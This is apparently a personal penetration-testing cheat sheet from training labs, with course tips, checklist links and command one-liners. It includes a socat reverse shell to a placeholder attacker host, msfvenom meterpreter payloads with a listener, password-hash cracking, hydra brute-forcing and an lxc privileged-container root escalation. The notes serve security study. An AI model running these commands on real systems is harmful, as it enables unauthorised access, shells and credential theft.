<p align="center">
  <img src="https://user-images.githubusercontent.com/1983431/192638275-fdccf0d7-9b2a-4773-98c8-74eb9892e36d.png">
</p>  

Disclaimer: this is not meant to be an exhaustive or comprehensive resource by any means and mostly entails things I would forget on occasion while completing courses. I would highly suggest checking the cheetsheets provided here as well as the ones available in my pentesting list.https://github.com/stars/viralhysteria/lists/pentesting  

# General Tips
**Cannot copy+paste into AttackBox using the supplied keycombo**  
Try switching from Split View to Fullscreen and allow clipboard access.

**OpenVPN config files are not connecting properly:**  
append 'data-ciphers AES-256-CBC' below auth in the header section.

**Can't configure DNS properly on Active Directory modules after using 'sudo systemctl restart NetworkManager':**   
Try leaving the room and re-joining. Make sure to reload the page first and verify your network hasn't become inactive.

# Notes

## Cheatsheets & Checklists
**General Cheatsheet:**
https://github.com/Tib3rius/Pentest-Cheatsheets

**Linux Recon Checklist:**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

**Alternate Checklist:**
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

**Windows Checklist:**
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

**Assorted:**  
Pentest wiki: https://github.com/nixawk/pentest-wiki  
Pentestmonkey: https://pentestmonkey.net/category/cheat-sheet  
OWASP: https://cheatsheetseries.owasp.org/

## Commands
**Configure Firewall respond w/ RST-TCP:**
```
iptables -I input -p tcp --dport [port] -j REJECT --reject-with tcp-reset
```
**scp upload:**
```
scp (-i ssh-key) [input] [user]@[remote-ip]:[output]
```
**scp download:**
```
scp [user]@[host-ip]:[input] [output]
```
**spawn + sanitize shell:**
```
python3 -c 'import pty;pty.spawn("/bin/bash")' && export TERM=xterm  
CTRL + Z (background victim session)  
stty raw -echo; fg
```
**enumerate directories:**
```
gobuster dir -u http://[ip]:[port] -w [wordlist]  
```
**find suid/sgid bit**:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null  
```
**find world-writeable folders:**
```
find / -writable -type d 2>/dev/null
```
**port recon:**
```
sudo nmap --min-hostgroup 100 -F -sS -n -T4
```
**samba recon:**
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse
```
**socat TCP:**
```
[attacker-ip]:[attacker-port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
>pty, allocates a pseudoterminal on the target -- part of the stabilisation process  
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell  
setsid, creates the process in a new session  
sane, stabilises the terminal, attempting to "normalise" it.  

**crack shadow file:**
```
unshadow passwd [shadow] > [output]
john -w=[wordlist] [output] --format=crypt
```
**generate passwd:**
```
openssl passwd -1 -salt [user] [pass]
```
**metasploit listener:**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[host-ip]; lport="[listen-port]" -f [format] -o [output]  

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <HOST>; set LPORT '<PORT>'; exploit"
```
> https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html

**remote file inclusion:**
```
curl -X POST -h [header] -d [payload] [url] -v -o [file]
```  
**john rules:**
```
cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
```
**http-form bruteforce:**
```
hydra -l [user] -P [list] [IP] http-post-form "[URL]:user=^USER^&pass=^PASS^:[ErrorMsg]"
```
**manual dos2unix:**
```
sed -i 's/\r//' [input]
```
## Miscellaneous
**RSA:** p, q, m, n, e, d, c  
p/q = prime, n = p*q  
pub = ne, priv = nd  
m = msg, c = cipher

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
https://github.com/nitishbadole/pentesting_Notes  
https://github.com/Ganapati/RsaCtfTool  
https://github.com/ius/rsatool
https://gtfobins.github.io/

**magic numbers:**
https://en.wikipedia.org/wiki/List_of_file_signatures  
**ports & services:** https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers

>STRIDE (Spoofing identity, Tampering with data, Repudiation threats, Information disclosure, Denial of Service and Elevation of privileges)
PASTA (Process for Attack Simulation and Threat Analysis)

## Windows
**show scheduled tasks:**
```
schtasks /query /tn vulntask /fo list /v
```
**sysmon:**
```
Get-WinEvent -Path <logfile> -FilterXPath '*/System/EventID=<id> [-Max-Events 1] | fl  
```
## Other
**lxc alpine:**
```
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true
lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true
lxc start CONTAINERNAME
lxc exec CONTAINERNAME /bin/sh  
verify: id | cd /mnt/root/root
```
